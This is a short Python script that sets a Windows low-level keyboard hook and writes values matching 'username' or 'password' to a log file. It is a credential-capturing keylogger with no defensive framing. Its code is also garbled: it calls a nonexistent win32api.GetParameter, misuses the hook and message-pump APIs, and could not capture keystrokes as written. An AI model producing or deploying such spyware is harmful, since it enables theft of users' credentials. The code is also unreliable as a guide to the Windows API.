import win32api
import win32con

def hook_func(nCode, wParam, lParam):
    if nCode >= 0:
        params = win32api.GetParameter(lParam, 1)
        if params == 'username' or params == 'password':
            with open('api_logs.txt', 'a') as f:
                f.write(params + '\n')
    return win32api.CallNextHookEx(None, nCode, wParam, lParam)

hook_id = win32api.SetWindowsHookEx(win32con.WH_KEYBOARD_LL, hook_func, win32api.GetModuleHandle(None), 0)
win32api.PumpMessages()
win32api.UnhookWindowsHookEx(hook_id)